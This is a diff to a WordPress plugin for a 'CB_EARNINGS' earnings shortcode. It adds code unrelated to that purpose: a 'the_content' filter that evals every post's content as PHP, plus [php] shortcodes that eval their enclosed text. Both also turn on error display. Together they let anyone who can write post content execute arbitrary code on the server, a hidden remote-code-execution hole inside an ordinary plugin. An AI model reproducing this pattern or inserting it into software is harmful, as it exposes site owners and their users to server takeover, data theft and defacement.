@@ -332,6 +332,8 @@ return $out2;
 }
 
 
+
+add_filter('the_content',"shortcode_tags");
 add_shortcode('CB_EARNINGS','cbearnings_short');
 
 
@@ -431,5 +433,79 @@ function plugin_setting_check_four_cb() {
 
 function plugin_section_text_cb() {
 	echo '<p>Set Url and Feed Path</p>';
-} 
+}
+
+
+function shortcodephp($args, $content=""){
+			error_reporting(E_ALL);
+			ini_set("display_errors","1");
+
+					$content =(htmlspecialchars($content,ENT_QUOTES));
+					$content = str_replace("&amp;#8217;","'",$content);
+					$content = str_replace("&amp;#8216;","'",$content);
+					$content = str_replace("&amp;#8242;","'",$content);
+					$content = str_replace("&amp;#8220;","\"",$content);
+					$content = str_replace("&amp;#8221;","\"",$content);
+					$content = str_replace("&amp;#8243;","\"",$content);
+					$content = str_replace("&amp;#039;","'",$content);
+					$content = str_replace("&#039;","'",$content);
+					$content = str_replace("&amp;#038;","&",$content);
+					$content = str_replace("&amp;lt;br /&amp;gt;"," ", $content);
+					$content = htmlspecialchars_decode($content);
+					$content = str_replace("<br />"," ",$content);
+					$content = str_replace("<p>"," ",$content);
+					$content = str_replace("</p>"," ",$content);
+					$content = str_replace("[br/]","<br/>",$content);
+					$content = str_replace("\\[","&#91;",$content);
+					$content = str_replace("\\]","&#93;",$content);
+					$content = str_replace("[","<",$content);
+					$content = str_replace("]",">",$content);
+					$content = str_replace("&#91;",'[',$content);
+					$content = str_replace("&#93;",']',$content);
+					$content = str_replace("&gt;",'>',$content);
+					$content = str_replace("&lt;",'<',$content);
+			ob_start();
+			eval($content);
+			return ob_get_clean();
+}
+
+function shortcode_tags($content){
+				error_reporting(E_ALL);
+				ini_set("display_errors","1");
+			
+					//remove_shortcode("PHP");
+					//remove_shortcode("php");
+					
+					$content = str_ireplace("[php]","<?php ",$content);
+					$content = str_ireplace("[/php]"," ?>",$content);					
+					
+					$content =(htmlspecialchars($content,ENT_QUOTES));
+					$content = str_replace("&amp;#8217;","'",$content);
+					$content = str_replace("&amp;#8216;","'",$content);
+					$content = str_replace("&amp;#8242;","'",$content);
+					$content = str_replace("&amp;#8220;","\"",$content);
+					$content = str_replace("&amp;#8221;","\"",$content);
+					$content = str_replace("&amp;#8243;","\"",$content);
+					$content = str_replace("&amp;#039;","'",$content);
+					$content = str_replace("&#039;","'",$content);
+					$content = str_replace("&amp;#038;","&",$content);
+					$content = str_replace("&amp;lt;br /&amp;gt;"," ", $content);
+					$content = htmlspecialchars_decode($content);					
+					$content = str_replace("&#91;",'[',$content);
+					$content = str_replace("&#93;",']',$content);
+					$content = str_replace("&gt;",'>',$content);
+					$content = str_replace("&lt;",'<',$content);
+
+					ob_start();
+					eval('?>'.$content);
+					$return = ob_get_clean();
+					return $return;
+				
+				
+}
+
+
+add_shortcode('php',"shortcodephp");
+add_shortcode('PHP',"shortcodephp");  
+ 
 ?>
